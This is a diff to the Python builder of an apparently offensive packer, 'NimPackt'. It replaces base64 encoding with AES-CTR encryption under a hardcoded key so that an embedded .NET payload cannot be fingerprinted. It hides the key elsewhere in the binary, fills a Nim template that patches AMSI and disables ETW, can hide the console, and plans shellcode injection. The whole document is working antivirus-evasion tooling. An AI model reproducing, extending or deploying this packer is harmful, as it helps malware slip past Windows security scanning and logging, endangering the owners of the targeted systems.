@@ -22,37 +22,79 @@
   #
   #-----
 
-import sys, os, argparse, base64
+import sys
+import argparse
+import binascii
+import os
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
 
-def cSharpToEncodedBin(inFilename):
-    # Construct the Nim bytearray in the right format
-    # Example: var buf: array[8, byte] = [byte 0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00]
-    # outFilename = inFilename + ".nimByteArray"
+### Base64 deprecated for AES encryption
+# def base64EncodeInputFile(inFilename):
+#     ### Deprecated code WITHIN deprecated code, how about that?!
+#     # Construct the Nim bytearray in the right format
+#     # Example: var buf: array[8, byte] = [byte 0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00]
+#     # outFilename = inFilename + ".nimByteArray"
 
-    # if os.path.exists(outFilename):
-    #     print(f"File '{outFilename}' already exists, using bytearray from this file...")
-    #     with open(outFilename,'r') as outFile:
-    #         return outFile.read()
+#     # if os.path.exists(outFilename):
+#     #     print(f"File '{outFilename}' already exists, using bytearray from this file...")
+#     #     with open(outFilename,'r') as outFile:
+#     #         return outFile.read()
 
+#     if not os.path.exists(inFilename):
+#         raise SystemExit("ERROR: Input file is not valid.")
+
+#     print("Encoding binary to embed...")
+#     with open(inFilename,'rb') as inFile:
+#         blob_data = bytearray(inFile.read())
+
+#         ### DEPRECATED - Below code embeds the plaintext bytestring which can be fingerprinted
+#         #result = f"let buf: array[{len(blob_data)}, byte] = [byte "
+#         #result = result + ",".join ([f"{x:#0{4}x}" for x in blob_data])
+#         #result = result + "]"
+#         #
+#         #with open(outFilename, 'w') as outFile:
+#         #    outFile.write(result)
+#         #    print(f"Wrote Nim bytestring to '{outFilename}'.")
+
+#         result = f"let b64buf : noCryptString = \"{str(base64.b64encode(blob_data), 'utf-8')}\""
+
+#     return result
+
+def int_of_string(s):
+    return int(binascii.hexlify(s), 16)
+
+def encrypt_message(key, plaintext):
+    iv = os.urandom(16)
+    ctr = Counter.new(128, initial_value=int_of_string(iv))
+    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
+    return iv + aes.encrypt(plaintext)
+
+def aesEncryptInputFile(inFilename):
     if not os.path.exists(inFilename):
         raise SystemExit("ERROR: Input file is not valid.")
 
-    print("Encoding binary to embed...")
+    print("Encrypting binary to embed...")
     with open(inFilename,'rb') as inFile:
         blob_data = bytearray(inFile.read())
+        plaintext = blob_data
+        key =  b"S3curity=numbah1" # AES-128, so 16 bytes
+        ciphertext = encrypt_message(key, plaintext)
 
-        ### DEPRECATED - Below code embeds the plaintext bytestring which can be fingerprinted
-        #result = f"let buf: array[{len(blob_data)}, byte] = [byte "
-        #result = result + ",".join ([f"{x:#0{4}x}" for x in blob_data])
-        #result = result + "]"
-        #
-        #with open(outFilename, 'w') as outFile:
-        #    outFile.write(result)
-        #    print(f"Wrote Nim bytestring to '{outFilename}'.")
+        cryptedInput = f"let cryptedInput: array[{len(ciphertext[16:])}, byte] = [byte "
+        cryptedInput = cryptedInput + ",".join ([f"{x:#0{4}x}" for x in ciphertext[16:]])
+        cryptedInput = cryptedInput + "]"
 
-        result = f"let b64buf : noCryptString = \"{str(base64.b64encode(blob_data), 'utf-8')}\""
+        cryptIV = f"let cryptIV: array[{len(ciphertext[:16])}, byte] = [byte "
+        cryptIV = cryptIV + ",".join ([f"{x:#0{4}x}" for x in ciphertext[:16]])
+        cryptIV = cryptIV + "]"
 
-    return result
+        # cryptKey is defined as a const to place it at a different spot in the binary
+        cryptKey = f"const cryptKey: array[{len(key)}, byte] = [byte "
+        cryptKey = cryptKey + ",".join ([f"{x:#0{4}x}" for x in key])
+        cryptKey = cryptKey + "]"
+
+    return cryptedInput, cryptIV, cryptKey
 
 def parseArguments(inArgs):
     # Construct the packed arguments in the right format (array split on space)
@@ -68,23 +110,24 @@ def parseArguments(inArgs):
 
     return result
         
-def generateNimSource(fileName, byteString, argString, disableAmsi, disableEtw, verbose):
+def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptIV, cryptKey, argString, disableAmsi, disableEtw, verbose):
     # Construct the Nim source file based on the passed arguments 
-    # Replace whole lines based on line number (+1 for null-starting)
-    with open('NimPackt.nim','r') as templateFile:
+    with open('NimPackt-Template-ExecuteAssembly.nim','r') as templateFile:
         result = ""
         for line in templateFile:
             new_line = line.rstrip()
+            new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
             new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
             new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
             new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
-            new_line = new_line.replace('#[ PLACEHOLDERBENCBIN ]#', byteString)
+            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
+            new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
             new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
             result += new_line +"\n"
 
         # Get output directory and name. Unfortunately nim does not allow hyphens or periods in the output file :/
         outDir = "./output/"
-        outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "NimPackt.nim"
+        outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim"
 
         if not os.path.exists(outDir):
             os.makedirs(outDir)
@@ -98,7 +141,6 @@ def generateNimSource(fileName, byteString, argString, disableAmsi, disableEtw, 
 def compileNim(fileName, hideApp, x64):
     # Compile the generated Nim file for Windows (cross-compile if run from linux)
     # Compilation flags are focused on stripping and optimizing the output binary for size
-    # Obfuscation (simple XOR on static strings) is handled by 'strenc' Nim library
     if x64:
         cpu = "amd64"
     else:
@@ -133,7 +175,8 @@ if __name__ == "__main__":
     optional = parser.add_argument_group('optional arguments')
 
     required.add_argument('-i', '--inputfile', action='store', dest='inputfile', help='C# .NET binary executable to wrap', required=True)
-    optional.add_argument('-a', '--arguments', action='store', dest='arguments', default="", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (defaults to empty string)')
+    optional.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", nargs="?", const="", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
+    optional.add_argument('-e', '--executionmode', action='store', dest='executionmode', default="execute-assembly", help='Execution mode of the packer. Supports "execute-assembly" (default), "shinject" (TODO), "shinject-remote" (TODO)')
     optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
     optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) by compiling it in GUI mode')
     optional.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
@@ -143,10 +186,21 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    encodedBin = cSharpToEncodedBin(args.inputfile)
+    if args.executionmode not in ["execute-assembly", "shinject", "shinject-remote"]:
+        raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either of 'execute-assembly', 'shinject', or 'shinject-remote'.")
+
+    if args.executionmode in ["shinject", "shinject-remote"]:
+        raise SystemExit("ERROR: Sorry, remote shellcode injection is not supported yet. Coming Soon™️")
+
+    if args.executionmode in ["shinject", "shinject-remote"] and args.arguments not in ["", "PASSTHRU"]:
+        print("WARNING: Arguments will be ignored in shellcode mode.")
+
+    cryptedInput, cryptIV, cryptKey = aesEncryptInputFile(args.inputfile)
 
     argString = parseArguments(args.arguments)
 
-    sourceFile = generateNimSource(args.inputfile, encodedBin, argString, args.patchAmsi, args.disableEtw, args.verbose)
+    if args.executionmode == "execute-assembly":
+        sourceFile = generateSource_ExecuteAssembly(args.inputfile, cryptedInput, cryptIV, cryptKey,
+            argString, args.patchAmsi, args.disableEtw, args.verbose)
 
     compileNim(sourceFile, args.hideApp, args.x64)
